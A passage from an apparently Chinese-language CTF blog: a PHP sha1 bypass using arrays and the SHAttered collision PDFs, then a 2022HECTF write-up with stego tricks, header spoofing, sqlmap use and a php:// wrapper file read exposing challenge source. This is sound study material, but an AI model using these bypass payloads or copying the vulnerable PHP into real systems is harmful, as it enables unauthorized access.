password.&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>可以使用数组来绕过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/sha1-1.jpg"><br>这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立</p>
<h1 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h1><p>既判断了两个值不能相等，又判断了是否为数组</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) || <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;There is no way you can sneak me, young man!&#x27;</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;yes&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这样只能找两个sha1值相等的<br>找到google放出两个SHA1值相同而不一样(SHA256的值不通)的pdf文件<br><a href="https://blog.csdn.net/caiqiiqi/article/details/68953730">具体分析</a><br><a href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br></code></pre></td></tr></table></figure>
<p><a href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure>
<p>满足所有条件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/sha1-2.jpg"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>特性</tag>
      </tags>
  </entry>
  <entry>
    <title>2022HECTF-WP</title>
    <url>/wp/2022HECTF.html</url>
    <content><![CDATA[<p>Rank: 13</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h2><p>追踪tcp流，某个POST包中看到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-1.png"></p>
<h2 id="舞者的秘密"><a href="#舞者的秘密" class="headerlink" title="舞者的秘密"></a>舞者的秘密</h2><p>数字暴力破解，得到密码<code>456123</code></p>
<p>给的后缀是png，看头实际上是gif</p>
<p>stegsolve一帧一帧看得到flag</p>
<h2 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h2><p>txt中存在0宽字符，得到<code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p>
<p>docx中去除字体隐藏，得到<code>a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2FmbGFhZmFmbWF6eWdwZWhma3pobGF6bmdmbW9mbGlhemx2bnhhbmFsdWdqbGFmb3ZsamZqdWJ6Z2FwZWhoZmtmbmZuZ2dwYWx5bGl2ZmVnYWFpZHJteWphZ2ZhbGdtYWdmbHJrbHVnYWRwZmZ1YWFreQ==</code></p>
<p>将docx中的字符串base64后和0宽得到的字符拼接在一起，然后进行词频分析，得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc1-2.png"></p>
<h2 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h2><p>图片补上<code>89 50 4E 47</code>，内容是zip</p>
<p>ocr后另存为，数字暴力破解得到<code>8686</code></p>
<p>解压得到<code>‖♬♩‖¶♯‖♬♭‖♬♫‖♫♪‖♫§‖‖‖‖♩¶♭♭♭‖♬♩‖♬¶‖‖‖‖♬∮♭♭♭‖¶§‖‖♯♭♭♭‖♬♩‖‖♭‖♬♭‖♬♫‖♫♫§=</code></p>
<p>千千秀字的在线音符解密得到<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code></p>
<h2 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h2><p>lsb得到一串字符串<br><code>63783037273333333b33434b7066338cfb9b8b3d3333337733333b333333555f52541d575c50de28385f2ff6c6deedae404521c8c182c0b081427fd1b7b80a086c21137d51f37a79cd7e797121fd8d80c4d1c0ca8b0ed0abb3299963e........</code></p>
<p>将字节异或51后发现恰好是<code>50 4b.....</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br>d=f.read()<br>d=d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">51</span>)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e)<br>f.close()<br></code></pre></td></tr></table></figure>

<p>解压后得到一个docx</p>
<p>将字体变成黑色得到flag</p>
<h2 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h2><p>问卷</p>
<h2 id="没大没小的鼓励"><a href="#没大没小的鼓励" class="headerlink" title="没大没小的鼓励"></a>没大没小的鼓励</h2><p><em>赛后复现</em></p>
<p>根据hint得知密码是<code>wocenimenma</code></p>
<p>进行大小写爆破</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-1.png"></p>
<p>sstv得到<code>YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-2.png"></p>
<p>base64得到<code>b8d55688410af102549de756eb3da854</code></p>
<p>md5得到<code>litangdj</code></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h2><p>1：hebnu is a good site.</p>
<p>传入<code>http://121.4.119.164:32063/hebnu</code></p>
<p>2: Can you use another way of requesting？</p>
<p>post传入<code>hebnu</code></p>
<p>3: 来自官网的你～。～</p>
<p>添加<code>Referer: https://www.hebtu.edu.cn</code></p>
<p>4：Can you come to my house to see me?</p>
<p>添加<code>X-Forwarded-For: 127.0.0.1</code></p>
<p>5：Internet Explorer is the best browser！</p>
<p>添加<code>User-Agent: Internet Explorer</code></p>
<p>最后在返回包的头中得到一串js，在控制台输入得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web2-1.png"></p>
<h2 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h2><p>sqlmap一把梭</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web3-1.png"></p>
<h2 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h2><p>对show参数用伪协议读文件</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FROM_INDEX&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]) ? <span class="hljs-string">&#x27;home&#x27;</span> : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\./&#x27;</span>, <span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/zip/i&#x27;</span>,<span class="hljs-variable">$show</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not this !!!&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&#x27;ob_gzhandler&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page_tshow</span>(<span class="hljs-params"><span class="hljs-variable">$show</span></span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>	&lt;div id=<span class="hljs-string">&quot;header&quot;</span>&gt;<br>		&lt;center&gt;&lt;a href=<span class="hljs-string">&quot;?show=home&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">logo</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">images</span>/<span class="hljs-title">logo</span>.<span class="hljs-title">jpg</span>&quot; <span class="hljs-title">alt</span>=&quot;&quot;&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">	&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">	&lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">body</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">fatal</span>($<span class="hljs-title">msg</span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">article</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Error</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">p</span>&gt;&lt;?=$<span class="hljs-title">msg</span>;?&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">exit</span>(1);</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">page_tshow</span>($<span class="hljs-title">show</span>);</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(!(<span class="hljs-title">include</span> $<span class="hljs-title">show</span> . &#x27;.<span class="hljs-title">php</span>&#x27;))</span><br><span class="hljs-class">    <span class="hljs-title">fatal</span>(&#x27;<span class="hljs-title">no</span> <span class="hljs-title">no</span> <span class="hljs-title">no</span>&#x27;);</span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;	surely exists&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;	dont exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span 